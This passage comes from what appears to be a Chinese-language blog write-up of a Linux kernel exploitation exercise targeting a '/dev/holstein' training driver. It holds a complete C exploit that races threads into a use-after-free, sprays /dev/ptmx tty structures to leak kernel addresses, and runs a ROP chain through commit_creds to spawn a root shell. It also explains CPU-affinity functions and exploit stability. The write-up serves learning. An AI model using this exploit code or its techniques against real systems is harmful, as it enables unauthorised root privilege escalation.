punctuation">,</span> <span class="token keyword">const</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>cpuset<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">pthread_getaffinity_np</span><span class="token punctuation">(</span><span class="token class-name">pthread_t</span> thread<span class="token punctuation">,</span> <span class="token class-name">size_t</span> cpusetsize<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>cpuset<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*同理*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>sched_setaffinity</code>与<code>pthread_setaffinity_np</code>都是绑定 CPU 核心的函数，但它们之间存在一些异同</p></li></ul><ol><li>sched_getaffinity是用来绑定进程的，pthread_getaffinity_np是用来绑定线程的。但是我们知道，<strong>绑定进程从本质上来讲，也是绑定线程</strong>。</li><li>可以发现，这两个方法传入的第一个参数是不一样的，sched_getaffinity传入的是进程ID，pthread_getaffinity_np传入的是线程ID。也就是说，一个线程会有两个ID，一个叫进程ID，一个叫线程ID，进程ID在内核中是独立的，由内核维护，线程ID在进程中是独立的，由进程维护。进程ID在不同进程间是有效的，这意味着你可以在进程中修改其他进程的属性，而线程ID无法在不同进程间共享。<strong>∴这两个函数最大的区别是，你可以在进程A调用sched_getaffinity修改掉进程B中的某个线程的绑定核。</strong></li><li>尽管 sched_setaffinity 的参数中有一个 pid，但它实际上可以用于设置当前线程的亲和性，而不仅仅是进程。这是因为线程和进程在 Linux 中具有共享的特性。</li></ol><h2 id="三-EXP"><a href="#三-EXP" class="headerlink" title="(三)EXP"></a>(三)EXP</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff810b13c5</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSD_RET</span> <span class="token expression"><span class="token number">0xffffffff8165094b</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_PP_RET</span> <span class="token expression"><span class="token number">0xffffffff8130f6c9</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PUSH_RDX_POP_RSP_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff81137da7</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> prepare_kernel_cred<span class="token operator">=</span><span class="token number">0xffffffff81072580</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds<span class="token operator">=</span><span class="token number">0xffffffff810723e0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">race</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> num1<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/tmp"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> num2<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/tmp"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>num1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>num2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token function">gettid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span><span class="token punctuation">)</span><span class="token punctuation">,</span>cpu_set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">==</span>num1 <span class="token operator">||</span> fd<span class="token operator">==</span>num2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>num1<span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>num2<span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] race Finished,fd:%x\n"</span><span class="token punctuation">,</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> fd<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>fd <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">pthread_t</span> th1<span class="token punctuation">,</span>th2<span class="token punctuation">;</span><span class="token class-name">cpu_set_t</span> th1_cpu<span class="token punctuation">,</span>th2_cpu<span class="token punctuation">;</span><span class="token keyword">int</span> fd1<span class="token punctuation">,</span>fd2<span class="token punctuation">;</span><span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th1_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th2_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>th1_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>th2_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] UAF#1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th1<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>race<span class="token punctuation">,</span><span class="token operator">&amp;</span>th1_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th2<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>race<span class="token punctuation">,</span><span class="token operator">&amp;</span>th2_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_join</span><span class="token punctuation">(</span>th1<span class="token punctuation">,</span><span class="token operator">&amp;</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_join</span><span class="token punctuation">(</span>th2<span class="token punctuation">,</span><span class="token operator">&amp;</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] fd1:%x fd2:%x\n"</span><span class="token punctuation">,</span>fd1<span class="token punctuation">,</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x200</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">char</span> check<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"X1NRI"</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>check<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>check<span class="token punctuation">,</span><span class="token string">"X1NRI"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] Race Condition Successfully!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> tty1_fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>tty1_fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] /dev/ptmx Opened\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">read</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x18</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> heap<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x38</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0x5401</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"UAF#1 spray Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>koff<span class="token operator">=</span>koff<span class="token operator">-</span><span class="token number">0xc3afe0</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span>heap<span class="token operator">=</span>heap<span class="token operator">-</span><span class="token number">0x38</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff => 0x%lx\n"</span><span class="token punctuation">,</span>koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] ropchain => 0x%lx\n"</span><span class="token punctuation">,</span>heap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x40</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_PP_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSD_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span>koff<span class="token operator">+</span><span class="token number">22</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">]</span><span class="token operator">=</span>PUSH_RDX_POP_RSP_POP_RBP_RET<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span>ropchain<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] UAF#2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">pthread_t</span> th3<span class="token punctuation">,</span>th4<span class="token punctuation">;</span><span class="token class-name">cpu_set_t</span> th3_cpu<span class="token punctuation">,</span>th4_cpu<span class="token punctuation">;</span><span class="token keyword">int</span> fd3<span class="token punctuation">,</span>fd4<span class="token punctuation">;</span><span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th3_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th4_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>th3_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>th4_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th3<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>race<span class="token punctuation">,</span><span class="token operator">&amp;</span>th3_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th4<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>race<span class="token punctuation">,</span><span class="token operator">&amp;</span>th4_cpu<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_join</span><span class="token punctuation">(</span>th3<span class="token punctuation">,</span><span class="token operator">&amp;</span>fd3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pthread_join</span><span class="token punctuation">(</span>th4<span class="token punctuation">,</span><span class="token operator">&amp;</span>fd4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] fd3:%x fd4:%x\n"</span><span class="token punctuation">,</span>fd3<span class="token punctuation">,</span>fd4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">"X1NRI"</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>check<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>check<span class="token punctuation">,</span><span class="token string">"X1NRI"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] Race Condition Successfully!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>fd3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> tty_fd2<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//bss 0xffffffffc00023c0</span><span class="token keyword">if</span> <span class="token punctuation">(</span>tty_fd2<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] /dev/ptmx Opened\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">read</span><span class="token punctuation">(</span>fd4<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0x5401</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"UAF#2 spray Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x18</span><span class="token punctuation">]</span><span class="token operator">=</span>heap<span class="token operator">+</span><span class="token number">0x30</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">-</span><span class="token number">0xc</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token comment">//ops_ioctl</span><span class="token function">write</span><span class="token punctuation">(</span>fd4<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd4<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>tty_fd2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> heap<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/cb9f333413946c5aa7aa3fad9c74fff7_MD5.jpeg"></p><h1 id="二、杂谈"><a href="#二、杂谈" class="headerlink" title="二、杂谈"></a>二、杂谈</h1><p>条件竞争的漏洞利用很难调试，因此利用的关键步骤是能否稳定地触发竞争。</p><p>我自己书写的EXP并不稳定，容易出现“卡死”的现象，在调试和利用时非常不方便；相反，原作者的EXP就显得稳定许多，以下是原作者的竞争线程：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">race</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span 